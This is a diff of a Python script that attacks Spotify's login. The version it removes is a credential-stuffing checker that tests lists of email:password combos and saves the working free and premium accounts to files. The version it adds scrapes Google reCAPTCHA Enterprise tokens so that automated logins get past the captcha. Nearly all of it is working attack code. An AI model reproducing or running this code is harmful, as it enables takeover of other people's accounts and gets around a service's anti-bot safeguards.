@@ -1,98 +1,85 @@
-import requests
-import os.path
-from os import path
+import re, crayons, requests
 
-LOGO="""
+def GetCaptchaToken():  
+    HeaderRecaptchaA =  {
+                            "Accept": "*/*",
+                            "Pragma": "no-cache",
+                            "User-Agent": 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0)'
+                        }
+    CaptchaGetData = requests.get("https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=en&v=_7Co1fh8iT2hcjvquYJ_3zSP&size=invisible&cb=l9c4tmvbpzv2", headers=HeaderRecaptchaA)
+    TokenA = "".join(re.findall("type=\"hidden\" id=\"recaptcha-token\" value=\"(.*?)\"", str(CaptchaGetData.text)))
+    
+    HeaderRecaptchaB =    {
+                                "Accept": "*/*",
+                                "accept-encoding": "gzip, deflate, br",
+                                "accept-language": "fa,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
+                                "content-length": "5628",
+                                "origin": "https://www.google.com",
+                                "User-Agent": 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0)',
+                                "Pragma": "no-cache",
+                                "sec-fetch-dest": "empty",
+                                "sec-fetch-mode": "cors",
+                                "sec-fetch-site": "same-origin",
+                                "referer": "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=en&v=_7Co1fh8iT2hcjvquYJ_3zSP&size=invisible&cb=l9c4tmvbpzv2"
+                            }
+    DataPayload =   {
+                        "v": "_7Co1fh8iT2hcjvquYJ_3zSP",
+                        "reason": "q",
+                        "c": TokenA,
+                        "k": "6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39",
+                        "co": "aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.",
+                        "size": "invisible",
+                        "cb": "l9c4tmvbpzv2",
+                        "hl": "en"
+                    }
+    TokenB = requests.post("https://www.google.com/recaptcha/enterprise/reload?k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39",headers=HeaderRecaptchaB, data=DataPayload)
+    captchaToken = "".join(re.findall("\[\"rresp\",\"(.*?)\"", str(TokenB.text)))
+    return captchaToken
 
-    __  _________ _____ _______   __   ____  _________    ____  __    ____  ________ __
-   / / / / ____(_) ___// ____/ | / /  / __ \/ ____/   |  / __ \/ /   / __ \/ ____/ //_/
-  / /_/ / __/ / /\__ \/ __/ /  |/ /  / / / / __/ / /| | / / / / /   / / / / /   / ,<   
- / __  / /___/ /___/ / /___/ /|  /  / /_/ / /___/ ___ |/ /_/ / /___/ /_/ / /___/ /| |  
-/_/ /_/_____/_//____/_____/_/ |_/  /_____/_____/_/  |_/_____/_____/\____/\____/_/ |_|  
-                                                                                       
-
-"""
-
-print(LOGO)
-print('BY https://GitHub.COM/heisenberg-official')
-
-def GET_CSRF() :
-    CSRF_REQUEST = requests.get('https://accounts.spotify.com')
-    if CSRF_REQUEST.status_code == 200:
-        return CSRF_REQUEST.cookies.get("csrf_token")
-
-if(path.exists('AccountList.txt') == True) :
-    foundFile = True
-else :
-    print('AccountList.txt File Not Found [ Create AccountList.txt File First ]')
-    exit()
-
-f = open("AccountList.txt", "r")
-Accounts = f.read()
-
-if(Accounts == '') :
-    print('No Accounts Found IN The File [ Add Accounts IN The Following Format user@email.com:password ]')
-    exit()
-Accounts= Accounts.split('\n')
-f.close()
-
-for x in range(len(Accounts)):
-    Account = Accounts[x]
-    Account = Account.split(':')
-
-    Username = Account[0]
-    Password = Account[1]
-
-    CSRF_Token = GET_CSRF()
-
-    cookies =   {
-		"fb_continue" : "https%3A%2F%2Fwww.spotify.com%2Fid%2Faccount%2Foverview%2F",
-		"sp_landing" : "play.spotify.com%2F",
-		"sp_landingref" : "https%3A%2F%2Fwww.google.com%2F",
-		"user_eligible" : "0",
-		"spot" : "%7B%22t%22%3A1498061345%2C%22m%22%3A%22id%22%2C%22p%22%3Anull%7D",
-		"sp_t" : "ac1439ee6195be76711e73dc0f79f89",
-		"sp_new" : "1",
-		"csrf_token" : CSRF_Token,
-		"__bon" : "MHwwfC0zMjQyMjQ0ODl8LTEzNjE3NDI4NTM4fDF8MXwxfDE=",
-		"remember" : "false@false.com",
-		"_ga" : "GA1.2.153026989.1498061376",
-		"_gid" : "GA1.2.740264023.1498061376"
-		}
-
-    headers =   {
-		"User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36",
-		"Accept" : "application/json, text/plain",
-		"Content-Type": "application/x-www-form-urlencoded"
-		}
-
-    params =    {
-		'remember':'true',
-		'username':Username,
-		'password':Password,
-		'csrf_token':CSRF_Token
-		}
-
-    session = requests.Session()
-    req = session.post(url = 'https://accounts.spotify.com/api/login', data = params, cookies = cookies, headers = headers)
-
-    if('displayName' in req.text) :
-        comboWorking = True
-        req = session.get('https://www.spotify.com/uk/account/subscription/')
-        if('Spotify Free' in req.text) :
-            free = open("FreeHits.txt", "a+")
-            print('[FREE-ACCOUNT] '+Username+':'+Password)
-            free.write(Username+':'+Password+'\n')
-            free.close()
-        else :
-            premium = open("Premium.txt", "a+")
-            print('[PREMIUM-ACCOUNT] '+Username+':'+Password)
-            premium.write(Username+':'+Password+'\n')
-            premium.close()
-
-    else :
-        notworking = open("Invalid.txt", "a+")
-        comboWorking = False
-        print('[INVALID-ACCOUNT] '+Username+':'+Password)
-        notworking.write(Username+':'+Password+'\n')
-        notworking.close()
+def InitiateLOGIN(Email,Password):
+    InitiateGetURI = "https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F"
+    DataA = requests.get(InitiateGetURI).cookies.get_dict()
+    CSRFToken = DataA['sp_sso_csrf_token']
+    SecureTPASESSION = DataA['__Secure-TPASESSION']
+    HostSPCSRFSiD = DataA['__Host-sp_csrf_sid']
+    HostDeviceID = DataA['__Host-device_id']
+    SpTR = DataA['sp_tr']
+    CaptchaToken = GetCaptchaToken()
+    print(crayons.yellow(f'ReCaptchaV3 Token Captured:\n{CaptchaToken}\n'))
+    PostURI = "https://accounts.spotify.com:443/login/password"
+    PostCookies =   {
+                        "__Host-device_id": str(HostDeviceID),
+                        "__Secure-TPASESSION": str(SecureTPASESSION),
+                        "sp_sso_csrf_token": str(CSRFToken),
+                        "sp_tr": str(SpTR),
+                        "__Host-sp_csrf_sid": str(HostSPCSRFSiD),
+                        "__bon": "MHwwfDYzMTA5NzUwM3wyNjUwNjA5NTEyNnwxfDF8MXwx",
+                        "remember": str(Email)
+                    }
+    PostHeaders =   {
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
+                        "Accept": "application/json, text/plain, */*",
+                        "Accept-Language": "en-US,en;q=0.5",
+                        "Accept-Encoding": "gzip, deflate",
+                        "Content-Type": "application/x-www-form-urlencoded",
+                        "X-Csrf-Token": str(CSRFToken),
+                        "Origin": "https://accounts.spotify.com",
+                        "Dnt": "1",
+                        "Referer": "https://accounts.spotify.com/en/login",
+                        "Sec-Fetch-Dest": "empty",
+                        "Sec-Fetch-Mode": "cors",
+                        "Sec-Fetch-Site": "same-origin",
+                        "Te": "trailers"
+                    }
+    PostData =      {
+                        "remember": "true",
+                        "continue": "https://accounts.spotify.com/en/status",
+                        "username": str(Email),
+                        "password": str(Password),
+                        "recaptchaToken": str(CaptchaToken)
+                    }
+    print(crayons.blue(f'Final Result: {requests.post(PostURI, headers=PostHeaders, cookies=PostCookies, data=PostData).text}'))
+def main():
+    InitiateLOGIN('EMAIL_HERE','PASSWORD_HERE')
+if __name__ == "__main__":
+    main()
